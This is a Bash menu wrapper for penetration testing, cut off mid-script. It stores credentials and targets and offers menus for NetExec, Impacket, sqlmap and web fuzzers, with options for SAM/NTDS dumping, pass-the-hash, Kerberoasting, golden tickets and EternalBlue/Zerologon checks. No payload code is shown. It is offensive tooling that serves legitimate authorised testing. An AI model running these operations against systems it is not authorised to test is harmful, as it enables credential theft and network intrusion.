#!/bin/bash
#
# Complete Penetration Testing Framework
# Web Testing + Network Testing in one unified interface
# v4.0 - Integrated Edition
#

set -e

# Database files
CREDS_DB="$HOME/.pentest-credentials.db"
TARGETS_DB="$HOME/.pentest-targets.db"
WEB_TARGETS_DB="$HOME/.pentest-web-targets.db"
AD_TARGETS_DB="$HOME/.pentest-ad-targets.db"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m'

# Current selections
CURRENT_CRED_NAME=""
CURRENT_TARGET_NAME=""
USERNAME=""
PASSWORD=""
DOMAIN=""
HASH=""
TARGET=""
RUN_MODE="single"  # single or all

# AD Target selections
CURRENT_AD_TARGET_NAME=""
AD_DOMAIN=""
AD_DC_NAME=""
AD_DC_IP=""
AD_ADDITIONAL_INFO=""

# Initialize credential database
init_creds_db() {
    if [[ ! -f "$CREDS_DB" ]]; then
        cat > "$CREDS_DB" << 'EOF'
# NXC Credentials Database
# Format: NAME|USERNAME|PASSWORD|DOMAIN|HASH
Null Auth|''|''||
Guest Account|guest|''||
EOF
        chmod 600 "$CREDS_DB"
    fi
}

# Initialize targets database
init_targets_db() {
    if [[ ! -f "$TARGETS_DB" ]]; then
        cat > "$TARGETS_DB" << 'EOF'
# NXC Targets Database
# Format: NAME|TARGET
EOF
        chmod 600 "$TARGETS_DB"
    fi
}

# Initialize web targets database
init_web_targets_db() {
    if [[ ! -f "$WEB_TARGETS_DB" ]]; then
        cat > "$WEB_TARGETS_DB" << 'EOF'
# Web Targets Database
# Format: NAME|URL
EOF
        chmod 600 "$WEB_TARGETS_DB"
    fi
}

# Initialize AD targets database
init_ad_targets_db() {
    if [[ ! -f "$AD_TARGETS_DB" ]]; then
        cat > "$AD_TARGETS_DB" << 'EOF'
# Active Directory Targets Database
# Format: NAME|DOMAIN|DC_NAME|DC_IP|ADDITIONAL_INFO
EOF
        chmod 600 "$AD_TARGETS_DB"
    fi
}

# List web targets
list_web_targets() {
    if [[ ! -f "$WEB_TARGETS_DB" ]]; then
        return 1
    fi
    grep -v '^#' "$WEB_TARGETS_DB" | grep -v '^$'
}

# List web target names
list_web_target_names() {
    list_web_targets | cut -d'|' -f1
}

# Add web target
add_web_target() {
    clear
    echo -e "${BLUE}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║     ADD NEW WEB TARGET                    ║${NC}"
    echo -e "${BLUE}╚═══════════════════════════════════════════╝${NC}"
    echo ""
    
    read -p "Target name: " name
    read -p "URL (e.g., https://example.com): " url
    
    if [[ -z "$name" ]] || [[ -z "$url" ]]; then
        echo -e "${RED}Name and URL cannot be empty!${NC}"
        sleep 2
        return 1
    fi
    
    echo "$name|$url" >> "$WEB_TARGETS_DB"
    echo -e "${GREEN}Web target '$name' added!${NC}"
    sleep 2
}

# Load web target
load_web_target() {
    local name="$1"
    local entry=$(list_web_targets | grep "^$name|")
    
    if [[ -z "$entry" ]]; then
        return 1
    fi
    
    CURRENT_WEB_TARGET="$name"
    WEB_TARGET_URL=$(echo "$entry" | cut -d'|' -f2)
}

# Select web target
select_web_target() {
    local web_target_names=$(list_web_target_names)
    
    if [[ -z "$web_target_names" ]]; then
        echo -e "${YELLOW}No web targets configured. Add one first.${NC}"
        sleep 2
        return
    fi
    
    local choice=$(echo "$web_target_names" | fzf --prompt="Select Web Target: " --height=50% --reverse --header="Current: $CURRENT_WEB_TARGET")
    
    if [[ -n "$choice" ]]; then
        load_web_target "$choice"
    fi
}

# Get web target URL
get_web_target_url() {
    if [[ -z "$CURRENT_WEB_TARGET" ]]; then
        echo -e "${YELLOW}No web target selected.${NC}" >&2
        local choice=$(echo "Select from Database
Enter Manually
Cancel" | fzf --prompt="How to provide URL: " --height=40% --reverse)
        
        case "$choice" in
            "Select from Database")
                select_web_target
                if [[ -z "$CURRENT_WEB_TARGET" ]]; then
                    return 1
                fi
                echo "$WEB_TARGET_URL"
                return 0
                ;;
            "Enter Manually")
                read -p "Enter URL: " manual_url
                if [[ -z "$manual_url" ]]; then
                    return 1
                fi
                echo "$manual_url"
                return 0
                ;;
            *)
                return 1
                ;;
        esac
    fi
    
    echo "$WEB_TARGET_URL"
}

# ===== AD TARGET MANAGEMENT =====

# List AD targets
list_ad_targets() {
    if [[ ! -f "$AD_TARGETS_DB" ]]; then
        return 1
    fi
    grep -v '^#' "$AD_TARGETS_DB" | grep -v '^$'
}

# List AD target names
list_ad_target_names() {
    list_ad_targets | cut -d'|' -f1
}

# Load AD target
load_ad_target() {
    local name=$1
    local line=$(grep "^${name}|" "$AD_TARGETS_DB")
    if [[ -n "$line" ]]; then
        CURRENT_AD_TARGET_NAME="$name"
        AD_DOMAIN=$(echo "$line" | cut -d'|' -f2)
        AD_DC_NAME=$(echo "$line" | cut -d'|' -f3)
        AD_DC_IP=$(echo "$line" | cut -d'|' -f4)
        AD_ADDITIONAL_INFO=$(echo "$line" | cut -d'|' -f5)
        return 0
    fi
    return 1
}

# Save AD target
save_ad_target() {
    local name=$1
    local domain=$2
    local dc_name=$3
    local dc_ip=$4
    local additional_info=$5

    # Check if target already exists
    if grep -q "^${name}|" "$AD_TARGETS_DB" 2>/dev/null; then
        echo -e "${RED}AD target '$name' already exists!${NC}"
        return 1
    fi

    echo "${name}|${domain}|${dc_name}|${dc_ip}|${additional_info}" >> "$AD_TARGETS_DB"
    return 0
}

# Delete AD target
delete_ad_target() {
    local name=$1
    sed -i "/^${name}|/d" "$AD_TARGETS_DB"
}

# Select AD target
select_ad_target() {
    local ad_target_names=$(list_ad_target_names)
    if [[ -z "$ad_target_names" ]]; then
        echo -e "${YELLOW}No AD targets available. Add one first!${NC}"
        sleep 2
        return 1
    fi

    local choice=$(echo "$ad_target_names" | fzf --prompt="Select AD Target: " --height=50% --reverse --header="Current: $CURRENT_AD_TARGET_NAME")

    if [[ -n "$choice" ]]; then
        load_ad_target "$choice"
        echo -e "${GREEN}AD target switched to: $choice${NC}"
        sleep 1
    fi
}

# Add AD target
add_ad_target() {
    clear
    echo -e "${BLUE}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║     ADD NEW ACTIVE DIRECTORY TARGET       ║${NC}"
    echo -e "${BLUE}╚═══════════════════════════════════════════╝${NC}"
    echo ""

    read -p "Target name (e.g., CorpDomain): " name
    read -p "Domain (e.g., corp.local): " domain
    read -p "Domain Controller name (e.g., DC01): " dc_name
    read -p "Domain Controller IP: " dc_ip
    read -p "Additional info (Domain SID, notes, etc.): " additional_info

    if [[ -z "$name" ]]; then
        echo -e "${RED}Name cannot be empty!${NC}"
        sleep 2
        return 1
    fi

    if save_ad_target "$name" "$domain" "$dc_name" "$dc_ip" "$additional_info"; then
        echo -e "${GREEN}AD target '$name' added!${NC}"
        load_ad_target "$name"
        sleep 2
    else
        sleep 2
        return 1
    fi
}

# Edit AD target
edit_ad_target() {
    local ad_target_names=$(list_ad_target_names)
    if [[ -z "$ad_target_names" ]]; then
        echo -e "${YELLOW}No AD targets to edit!${NC}"
        sleep 2
        return 1
    fi

    local choice=$(echo "$ad_target_names" | fzf --prompt="Select AD Target to Edit: " --height=50% --reverse)

    if [[ -z "$choice" ]]; then
        return 1
    fi

    # Load existing values
    load_ad_target "$choice"

    clear
    echo -e "${BLUE}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║     EDIT AD TARGET: $choice${NC}"
    echo -e "${BLUE}╚═══════════════════════════════════════════╝${NC}"
    echo ""
    echo "Press Enter to keep current value"
    echo ""

    read -p "Domain [$AD_DOMAIN]: " new_domain
    read -p "DC Name [$AD_DC_NAME]: " new_dc_name
    read -p "DC IP [$AD_DC_IP]: " new_dc_ip
    read -p "Additional Info [$AD_ADDITIONAL_INFO]: " new_additional_info

    # Use current values if empty
    [[ -z "$new_domain" ]] && new_domain="$AD_DOMAIN"
    [[ -z "$new_dc_name" ]] && new_dc_name="$AD_DC_NAME"
    [[ -z "$new_dc_ip" ]] && new_dc_ip="$AD_DC_IP"
    [[ -z "$new_additional_info" ]] && new_additional_info="$AD_ADDITIONAL_INFO"

    # Delete old entry and add new one
    delete_ad_target "$choice"
    save_ad_target "$choice" "$new_domain" "$new_dc_name" "$new_dc_ip" "$new_additional_info"
    load_ad_target "$choice"

    echo -e "${GREEN}AD target updated!${NC}"
    sleep 2
}

# Manage AD targets menu
manage_ad_targets() {
    while true; do
        clear
        local choice=$(echo "Add AD Target
Edit AD Target
Delete AD Target
Select AD Target
List All AD Targets
Back" | fzf --prompt="Manage AD Targets: " --height=50% --reverse)

        case "$choice" in
            "Add AD Target")
                add_ad_target
                ;;
            "Edit AD Target")
                edit_ad_target
                ;;
            "Delete AD Target")
                local ad_target_names=$(list_ad_target_names)
                if [[ -z "$ad_target_names" ]]; then
                    echo -e "${YELLOW}No AD targets to delete!${NC}"
                    sleep 2
                    continue
                fi
                local to_delete=$(echo "$ad_target_names" | fzf --prompt="Select AD Target to Delete: " --height=50% --reverse)
                if [[ -n "$to_delete" ]]; then
                    delete_ad_target "$to_delete"
                    echo -e "${GREEN}AD target '$to_delete' deleted!${NC}"
                    if [[ "$CURRENT_AD_TARGET_NAME" == "$to_delete" ]]; then
                        CURRENT_AD_TARGET_NAME=""
                        AD_DOMAIN=""
                        AD_DC_NAME=""
                        AD_DC_IP=""
                        AD_ADDITIONAL_INFO=""
                    fi
                    sleep 2
                fi
                ;;
            "Select AD Target")
                select_ad_target
                ;;
            "List All AD Targets")
                clear
                echo -e "${BLUE}╔═══════════════════════════════════════════╗${NC}"
                echo -e "${BLUE}║     ALL AD TARGETS                        ║${NC}"
                echo -e "${BLUE}╚═══════════════════════════════════════════╝${NC}"
                echo ""
                if [[ -f "$AD_TARGETS_DB" ]]; then
                    list_ad_targets | while IFS='|' read -r name domain dc_name dc_ip additional_info; do
                        echo -e "${GREEN}$name${NC}"
                        echo -e "  Domain: ${CYAN}$domain${NC}"
                        echo -e "  DC Name: ${CYAN}$dc_name${NC}"
                        echo -e "  DC IP: ${CYAN}$dc_ip${NC}"
                        if [[ -n "$additional_info" ]]; then
                            echo -e "  Info: ${YELLOW}$additional_info${NC}"
                        fi
                        echo ""
                    done
                fi
                read -p "Press Enter to continue..."
                ;;
            "Back"|"")
                return 0
                ;;
        esac
    done
}

# Find NXC download directory
find_nxc_downloads() {
    # NetExec saves spider_plus downloads to ~/.nxc/modules/nxc_spider_plus
    local dirs=(
        "$HOME/.nxc/modules/nxc_spider_plus"
        "$HOME/.nxc/modules"
        "$HOME/.nxc/logs"
        "/tmp/nxc_hosted/nxc_spider_plus"
        "/tmp/nxc"
    )
    
    for dir in "${dirs[@]}"; do
        if [[ -d "$dir" ]] && [[ $(find "$dir" -type f 2>/dev/null | wc -l) -gt 0 ]]; then
            echo "$dir"
            return 0
        fi
    done
    
    echo "$HOME/.nxc/modules/nxc_spider_plus"
    return 1
}

# Show downloaded files intelligently
show_downloads() {
    echo -e "\n${GREEN}Searching for downloaded files...${NC}\n"
    
    local found=0
    local dirs=(
        "$HOME/.nxc/modules/nxc_spider_plus"
        "$HOME/.nxc/modules"
        "$HOME/.nxc/logs"
        "/tmp/nxc_hosted/nxc_spider_plus"
        "/tmp/nxc"
    )
    
    for dir in "${dirs[@]}"; do
        if [[ -d "$dir" ]]; then
            local file_count=$(find "$dir" -type f 2>/dev/null | wc -l)
            if [[ $file_count -gt 0 ]]; then
                echo -e "${GREEN}═══ Found $file_count files in: $dir ═══${NC}"
                ls -lhR "$dir" 2>/dev/null | tail -50
                echo ""
                found=1
            fi
        fi
    done
    
    if [[ $found -eq 0 ]]; then
        echo -e "${YELLOW}No files found in common NXC locations.${NC}"
        echo -e "${CYAN}NXC spider_plus saves to:${NC}"
        echo -e "  • $HOME/.nxc/modules/nxc_spider_plus/"
        echo -e "  • $HOME/.nxc/logs/"
        echo -e ""
        echo -e "${CYAN}Search manually with:${NC}"
        echo -e "  find ~/.nxc -name '*spider*' -type f 2>/dev/null"
    fi
    
    read -p "Press Enter to continue..."
}

# List credential names
list_cred_names() {
    grep -v "^#" "$CREDS_DB" | grep -v "^$" | cut -d'|' -f1
}

# List target names
list_target_names() {
    grep -v "^#" "$TARGETS_DB" | grep -v "^$" | cut -d'|' -f1
}

# Get all targets
get_all_targets() {
    grep -v "^#" "$TARGETS_DB" | grep -v "^$" | cut -d'|' -f2
}

# Load credential set
load_creds() {
    local name=$1
    local line=$(grep "^${name}|" "$CREDS_DB")
    
    if [[ -n "$line" ]]; then
        CURRENT_CRED_NAME="$name"
        USERNAME=$(echo "$line" | cut -d'|' -f2)
        PASSWORD=$(echo "$line" | cut -d'|' -f3)
        DOMAIN=$(echo "$line" | cut -d'|' -f4)
        HASH=$(echo "$line" | cut -d'|' -f5)
    fi
}

# Load target
load_target() {
    local name=$1
    local line=$(grep "^${name}|" "$TARGETS_DB")
    
    if [[ -n "$line" ]]; then
        CURRENT_TARGET_NAME="$name"
        TARGET=$(echo "$line" | cut -d'|' -f2)
    fi
}

# Save credential set
save_creds() {
    local name=$1
    local username=$2
    local password=$3
    local domain=$4
    local hash=$5
    
    sed -i "/^${name}|/d" "$CREDS_DB"
    echo "${name}|${username}|${password}|${domain}|${hash}" >> "$CREDS_DB"
}

# Save target
save_target() {
    local name=$1
    local target=$2
    
    sed -i "/^${name}|/d" "$TARGETS_DB"
    echo "${name}|${target}" >> "$TARGETS_DB"
}

# Delete credential set
delete_creds() {
    local name=$1
    sed -i "/^${name}|/d" "$CREDS_DB"
}

# Delete target
delete_target() {
    local name=$1
    sed -i "/^${name}|/d" "$TARGETS_DB"
}

# Show credential selector menu
select_credentials() {
    local cred_names=$(list_cred_names)
    local choice=$(echo "$cred_names" | fzf --prompt="Select Credentials: " --height=50% --reverse --header="Current: $CURRENT_CRED_NAME")
    
    if [[ -n "$choice" ]]; then
        load_creds "$choice"
    fi
}

# Show target selector menu
select_target() {
    local target_names=$(list_target_names)
    
    if [[ -z "$target_names" ]]; then
        echo -e "${YELLOW}No targets configured. Add one first.${NC}"
        sleep 2
        return
    fi
    
    local choice=$(echo "$target_names" | fzf --prompt="Select Target: " --height=50% --reverse --header="Current: $CURRENT_TARGET_NAME")
    
    if [[ -n "$choice" ]]; then
        load_target "$choice"
        RUN_MODE="single"
    fi
}

# Toggle run mode
toggle_run_mode() {
    local target_count=$(list_target_names | wc -l)
    
    if [[ $target_count -eq 0 ]]; then
        echo -e "${YELLOW}No targets configured. Add targets first.${NC}"
        sleep 2
        return
    fi
    
    local choice=$(echo "Run on Current Target Only
Run on All Targets" | fzf --prompt="Select Run Mode: " --height=40% --reverse)
    
    case "$choice" in
        "Run on Current Target Only")
            RUN_MODE="single"
            ;;
        "Run on All Targets")
            RUN_MODE="all"
            ;;
    esac
}

# Add new credential set
add_credentials() {
    clear
    echo -e "${BLUE}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║     ADD NEW CREDENTIAL SET                ║${NC}"
    echo -e "${BLUE}╚═══════════════════════════════════════════╝${NC}"
    echo ""
    
    read -p "Credential Set Name: " name
    
    if [[ -z "$name" ]]; then
        echo -e "${RED}Name cannot be empty!${NC}"
        sleep 2
        return
    fi
    
    read -p "Username: " username
    read -sp "Password: " password
    echo ""
    read -p "Domain (optional): " domain
    read -p "NTLM Hash (optional): " hash
    
    save_creds "$name" "$username" "$password" "$domain" "$hash"
    
    echo -e "\n${GREEN}✓ Credential set '${name}' saved!${NC}"
    sleep 2
}

# Add new target
add_target() {
    clear
    echo -e "${BLUE}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║     ADD NEW TARGET                        ║${NC}"
    echo -e "${BLUE}╚═══════════════════════════════════════════╝${NC}"
    echo ""
    
    read -p "Target Name: " name
    
    if [[ -z "$name" ]]; then
        echo -e "${RED}Name cannot be empty!${NC}"
        sleep 2
        return
    fi
    
    read -p "IP Address/Range/Hostname: " target
    
    if [[ -z "$target" ]]; then
        echo -e "${RED}Target cannot be empty!${NC}"
        sleep 2
        return
    fi
    
    save_target "$name" "$target"
    
    echo -e "\n${GREEN}✓ Target '${name}' saved!${NC}"
    
    # Auto-select if this is the first target
    local count=$(list_target_names | wc -l)
    if [[ $count -eq 1 ]]; then
        load_target "$name"
        echo -e "${GREEN}✓ Automatically selected as current target${NC}"
    fi
    
    sleep 2
}

# Edit credential set
edit_credentials() {
    local cred_names=$(list_cred_names)
    local choice=$(echo "$cred_names" | fzf --prompt="Edit Credentials: " --height=50% --reverse)
    
    if [[ -n "$choice" ]]; then
        load_creds "$choice"
        
        clear
        echo -e "${BLUE}╔═══════════════════════════════════════════╗${NC}"
        echo -e "${BLUE}║     EDIT CREDENTIAL SET                   ║${NC}"
        echo -e "${BLUE}╚═══════════════════════════════════════════╝${NC}"
        echo -e "${CYAN}Editing: ${choice}${NC}"
        echo ""
        
        read -p "Username [$USERNAME]: " new_username
        read -sp "Password: " new_password
        echo ""
        read -p "Domain [$DOMAIN]: " new_domain
        read -p "NTLM Hash [$HASH]: " new_hash
        
        username=${new_username:-$USERNAME}
        password=${new_password:-$PASSWORD}
        domain=${new_domain:-$DOMAIN}
        hash=${new_hash:-$HASH}
        
        save_creds "$choice" "$username" "$password" "$domain" "$hash"
        load_creds "$choice"
        
        echo -e "\n${GREEN}✓ Credential set updated!${NC}"
        sleep 2
    fi
}

# Edit target
edit_target() {
    local target_names=$(list_target_names)
    
    if [[ -z "$target_names" ]]; then
        echo -e "${YELLOW}No targets to edit.${NC}"
        sleep 2
        return
    fi
    
    local choice=$(echo "$target_names" | fzf --prompt="Edit Target: " --height=50% --reverse)
    
    if [[ -n "$choice" ]]; then
        load_target "$choice"
        
        clear
        echo -e "${BLUE}╔═══════════════════════════════════════════╗${NC}"
        echo -e "${BLUE}║     EDIT TARGET                           ║${NC}"
        echo -e "${BLUE}╚═══════════════════════════════════════════╝${NC}"
        echo -e "${CYAN}Editing: ${choice}${NC}"
        echo ""
        
        read -p "IP Address/Range/Hostname [$TARGET]: " new_target
        
        target=${new_target:-$TARGET}
        
        save_target "$choice" "$target"
        load_target "$choice"
        
        echo -e "\n${GREEN}✓ Target updated!${NC}"
        sleep 2
    fi
}

# Delete credential set
delete_credential_set() {
    local cred_names=$(list_cred_names | grep -v "^Null Auth$" | grep -v "^Guest Account$")
    
    if [[ -z "$cred_names" ]]; then
        echo -e "${YELLOW}No custom credential sets to delete.${NC}"
        sleep 2
        return
    fi
    
    local choice=$(echo "$cred_names" | fzf --prompt="Delete Credentials: " --height=50% --reverse)
    
    if [[ -n "$choice" ]]; then
        read -p "Delete '${choice}'? (y/n): " confirm
        if [[ "$confirm" == "y" || "$confirm" == "Y" ]]; then
            delete_creds "$choice"
            echo -e "${GREEN}✓ Deleted!${NC}"
            if [[ "$choice" == "$CURRENT_CRED_NAME" ]]; then
                load_creds "Null Auth"
            fi
            sleep 2
        fi
    fi
}

# Delete target
delete_target_entry() {
    local target_names=$(list_target_names)
    
    if [[ -z "$target_names" ]]; then
        echo -e "${YELLOW}No targets to delete.${NC}"
        sleep 2
        return
    fi
    
    local choice=$(echo "$target_names" | fzf --prompt="Delete Target: " --height=50% --reverse)
    
    if [[ -n "$choice" ]]; then
        read -p "Delete '${choice}'? (y/n): " confirm
        if [[ "$confirm" == "y" || "$confirm" == "Y" ]]; then
            delete_target "$choice"
            echo -e "${GREEN}✓ Deleted!${NC}"
            if [[ "$choice" == "$CURRENT_TARGET_NAME" ]]; then
                CURRENT_TARGET_NAME=""
                TARGET=""
            fi
            sleep 2
        fi
    fi
}

# Manage credentials menu
manage_credentials() {
    while true; do
        clear
        echo -e "${BLUE}╔═══════════════════════════════════════════╗${NC}"
        echo -e "${BLUE}║     CREDENTIAL MANAGEMENT                 ║${NC}"
        echo -e "${BLUE}╚═══════════════════════════════════════════╝${NC}"
        echo ""
        
        local choice=$(echo "Add New Credential Set
Edit Credential Set
Delete Credential Set
Back to Main Menu" | fzf --prompt="Select Action: " --height=40% --reverse)
        
        case "$choice" in
            "Add New Credential Set")
                add_credentials
                ;;
            "Edit Credential Set")
                edit_credentials
                ;;
            "Delete Credential Set")
                delete_credential_set
                ;;
            "Back to Main Menu"|"")
                return
                ;;
        esac
    done
}

# Manage targets menu
manage_targets() {
    while true; do
        clear
        echo -e "${BLUE}╔═══════════════════════════════════════════╗${NC}"
        echo -e "${BLUE}║     TARGET MANAGEMENT                     ║${NC}"
        echo -e "${BLUE}╚═══════════════════════════════════════════╝${NC}"
        echo ""
        
        local choice=$(echo "Add New Target
Edit Target
Delete Target
Back to Main Menu" | fzf --prompt="Select Action: " --height=40% --reverse)
        
        case "$choice" in
            "Add New Target")
                add_target
                ;;
            "Edit Target")
                edit_target
                ;;
            "Delete Target")
                delete_target_entry
                ;;
            "Back to Main Menu"|"")
                return
                ;;
        esac
    done
}

# Manage web targets
manage_web_targets() {
    while true; do
        clear
        echo -e "${BLUE}╔═══════════════════════════════════════════╗${NC}"
        echo -e "${BLUE}║     WEB TARGET MANAGEMENT                 ║${NC}"
        echo -e "${BLUE}╚═══════════════════════════════════════════╝${NC}"
        echo ""
        
        local choice=$(echo "Add New Web Target
Select Web Target
List Web Targets
Delete Web Target
Back to Main Menu" | fzf --prompt="Select Action: " --height=40% --reverse)
        
        case "$choice" in
            "Add New Web Target")
                add_web_target
                ;;
            "Select Web Target")
                select_web_target
                ;;
            "List Web Targets")
                clear
                echo -e "${CYAN}=== Web Targets ===${NC}\n"
                list_web_targets | column -t -s'|' || echo "No web targets found"
                echo ""
                read -p "Press Enter to continue..."
                ;;
            "Delete Web Target")
                local web_target_names=$(list_web_target_names)
                if [[ -z "$web_target_names" ]]; then
                    echo -e "${YELLOW}No web targets to delete.${NC}"
                    sleep 2
                else
                    local target_choice=$(echo "$web_target_names" | fzf --prompt="Delete Web Target: " --height=50% --reverse)
                    if [[ -n "$target_choice" ]]; then
                        read -p "Delete '$target_choice'? (y/n): " confirm
                        if [[ "$confirm" == "y" ]]; then
                            sed -i "/^${target_choice}|/d" "$WEB_TARGETS_DB"
                            echo -e "${GREEN}✓ Deleted!${NC}"
                            if [[ "$target_choice" == "$CURRENT_WEB_TARGET" ]]; then
                                CURRENT_WEB_TARGET=""
                                WEB_TARGET_URL=""
                            fi
                            sleep 2
                        fi
                    fi
                fi
                ;;
            "Back to Main Menu"|"")
                return
                ;;
        esac
    done
}

# Build auth string
build_auth() {
    local auth=""
    
    if [[ "$CURRENT_CRED_NAME" == "Null Auth" ]]; then
        auth="-u '' -p ''"
        echo "$auth"
        return
    fi
    
    if [[ "$CURRENT_CRED_NAME" == "Guest Account" ]]; then
        auth="-u guest -p ''"
        echo "$auth"
        return
    fi
    
    if [[ -n "$HASH" ]]; then
        auth="-u $USERNAME -H $HASH"
    else
        auth="-u $USERNAME -p '$PASSWORD'"
    fi
    
    if [[ -n "$DOMAIN" ]]; then
        auth="$auth -d $DOMAIN"
    fi
    
    echo "$auth"
}

# Get target for command
get_target_for_command() {
    if [[ "$RUN_MODE" == "all" ]]; then
        # Return all targets space-separated
        echo "$(get_all_targets | tr '\n' ' ')"
    else
        # Return current target
        if [[ -z "$TARGET" ]]; then
            echo -e "${RED}No target selected!${NC}" >&2
            read -p "Press Enter to continue..." >&2
            return 1
        fi
        echo "$TARGET"
    fi
}

# Show menu using fzf
show_menu() {
    local category=$1
    local prompt=$2
    
    local run_mode_text="Single Target"
    if [[ "$RUN_MODE" == "all" ]]; then
        run_mode_text="All Targets ($(list_target_names | wc -l) total)"
    fi

    local ad_target_text=""
    if [[ -n "$CURRENT_AD_TARGET_NAME" ]]; then
        ad_target_text=" | AD: $CURRENT_AD_TARGET_NAME"
    fi

    local header="Creds: $CURRENT_CRED_NAME | Target: ${CURRENT_TARGET_NAME:-<none>}${ad_target_text} | Mode: $run_mode_text"
    
    case $category in
        "main")
            echo "┌ WEB TESTING ───────────────────────────
Feroxbuster (Directory/File Discovery)
WFUZZ (Fuzzing)
SQLMap (SQL Injection)
HTTPX (HTTP Probing)
┌ NETWORK TESTING - NXC ─────────────────
SMB Authentication
SMB Enumeration
SMB Shares
SMB Execution
SMB Credentials
SMB Vulnerabilities
LDAP Enumeration
LDAP BloodHound
WinRM Operations
MSSQL Operations
RDP Operations
SSH Operations
Network Scanning
┌ NETWORK TESTING - IMPACKET ────────────
Impacket PSExec
Impacket WMIExec
Impacket SMBExec
Impacket ATExec
Impacket DcomExec
Impacket SecretsDump
Impacket SAM/LSA/NTDS Dump
Kerberoasting (GetUserSPNs)
AS-REP Roasting (GetNPUsers)
Golden/Silver Tickets
Impacket Enumeration
Impacket SMB Client
Service Management
Registry Operations
┌ SETTINGS ─────────────────────────────
Manage Web Targets
Manage AD Targets
Switch Credentials
Switch Target
Select AD Target
Toggle Run Mode (Single/All)
Manage Credentials
Manage Targets
Exit" | fzf --prompt="$prompt" --height=100% --reverse --header="$header" --expect=t,c,w,a,s,m,d --header-first --header="$header
───────────────────────────────────────
Keybinds: [t]argets [c]reds [w]eb [d] AD [a]uthSwitch [s]TargetSwitch [m]ode"
            ;;
        "feroxbuster")
            echo "Basic Directory Scan
Deep Scan with Extensions
Custom Wordlist Scan
Burp Integration Scan
API Discovery
Backup File Discovery
Custom Scan
Back" | fzf --prompt="$prompt" --height=50% --reverse --header="$header"
            ;;
        "wfuzz")
            echo "VHOST Fuzzing
Parameter Fuzzing (GET)
Parameter Fuzzing (POST)
DNS Subdomain Fuzzing
Directory Fuzzing
Header Fuzzing
Custom Fuzzing
Back" | fzf --prompt="$prompt" --height=50% --reverse --header="$header"
            ;;
        "sqlmap")
            echo "Basic SQL Injection Scan
POST Data Injection
Cookie-based Injection
Custom Headers Injection
Dump Current Database
Dump All Databases
Get OS Shell
Read File from Server
Write File to Server
Custom Scan
Back" | fzf --prompt="$prompt" --height=60% --reverse --header="$header"
            ;;
        "httpx")
            echo "Probe Single URL
Probe from URL List
Probe from Nmap IPs
Extract Page Titles
Technology Detection
Full Discovery Scan
Screenshot Websites
Custom Probe
Back" | fzf --prompt="$prompt" --height=50% --reverse --header="$header"
            ;;
        "smb_auth")
            echo "Test Authentication
Test with Domain
Pass-the-Hash
Local Authentication
Back" | fzf --prompt="$prompt" --height=40% --reverse --header="$header"
            ;;
        "smb_enum")
            echo "List Shares
Enumerate Users
Enumerate Local Users
Enumerate Groups
Password Policy
Active Sessions
Logged On Users
RID Bruteforce
List Disks
Full Enumeration (All)
Back" | fzf --prompt="$prompt" --height=60% --reverse --header="$header"
            ;;
        "smb_shares")
            echo "Browse & Download Files (Interactive)
Download All Files (Recursive)
Download Files by Pattern
Spider & List Only (No Download)
Spider Specific Share
Download Specific File (Manual Path)
Upload File
Back" | fzf --prompt="$prompt" --height=50% --reverse --header="$header"
            ;;
        "smb_exec")
            echo "Execute Command (CMD)
Execute PowerShell
Get System Info
List Processes
Network Configuration
List Administrators
Check Privileges
Back" | fzf --prompt="$prompt" --height=50% --reverse --header="$header"
            ;;
        "smb_creds")
            echo "Dump SAM Database
Dump LSA Secrets
Dump NTDS (Domain Controller)
Dump All (SAM+LSA+NTDS)
Lsassy (Memory Dump)
Nanodump
WiFi Passwords
Back" | fzf --prompt="$prompt" --height=50% --reverse --header="$header"
            ;;
        "smb_vulns")
            echo "MS17-010 (EternalBlue)
Zerologon (CVE-2020-1472)
PetitPotam
NoPac (CVE-2021-42278)
SMBGhost (CVE-2020-0796)
PrintNightmare
All Vulnerability Checks
Back" | fzf --prompt="$prompt" --height=50% --reverse --header="$header"
            ;;
        "ldap")
            echo "Enumerate Users
Enumerate Groups
Get User Descriptions
Enumerate Computers
Enumerate Domain Trusts
ADCS Enumeration
Check LDAP Signing
Get All User Attributes
Back" | fzf --prompt="$prompt" --height=60% --reverse --header="$header"
            ;;
        "bloodhound")
            echo "Collect All
Collect Sessions
Collect Trusts
Collect ACL
Collect Groups
Back" | fzf --prompt="$prompt" --height=40% --reverse --header="$header"
            ;;
        "winrm")
            echo "Test Authentication
Execute Command
Execute PowerShell
Get System Info
Check Privileges
List Local Users
Network Configuration
Back" | fzf --prompt="$prompt" --height=50% --reverse --header="$header"
            ;;
        "mssql")
            echo "Test Authentication
Get MSSQL Version
List Databases
List Tables
Check Privileges
Execute Command (xp_cmdshell)
Enable xp_cmdshell
Back" | fzf --prompt="$prompt" --height=50% --reverse --header="$header"
            ;;
        "rdp")
            echo "Test Authentication
RDP Scanner
Take Screenshot
Back" | fzf --prompt="$prompt" --height=40% --reverse --header="$header"
            ;;
        "ssh")
            echo "Test Authentication
Execute Command
Get System Info
Check Sudo Privileges
Back" | fzf --prompt="$prompt" --height=40% --reverse --header="$header"
            ;;
        "scanning")
            echo "Scan Current Target
Password Spray
Find Admin Access
Multi-Protocol Scan
Back" | fzf --prompt="$prompt" --height=40% --reverse --header="$header"
            ;;
        "impacket_psexec")
            echo "Execute Command
Interactive Shell
Execute as SYSTEM
Upload and Execute
Execute with Specific Service Name" | fzf --prompt="$prompt" --height=40% --reverse --header="$header"
            ;;
        "impacket_wmiexec")
            echo "Execute Command
Interactive Shell
Execute with Output
Silent Execution (No Output)" | fzf --prompt="$prompt" --height=40% --reverse --header="$header"
            ;;
        "impacket_smbexec")
            echo "Execute Command
Interactive Shell
Execute with Custom Share
Execute without Deleting" | fzf --prompt="$prompt" --height=40% --reverse --header="$header"
            ;;
        "impacket_atexec")
            echo "Execute Command (Scheduled Task)
Execute with Custom Task Name
Execute and Wait for Output" | fzf --prompt="$prompt" --height=40% --reverse --header="$header"
            ;;
        "impacket_dcomexec")
            echo "Execute Command (ShellWindows)
Execute Command (ShellBrowserWindow)
Execute Command (MMC20)" | fzf --prompt="$prompt" --height=40% --reverse --header="$header"
            ;;
        "impacket_secretsdump")
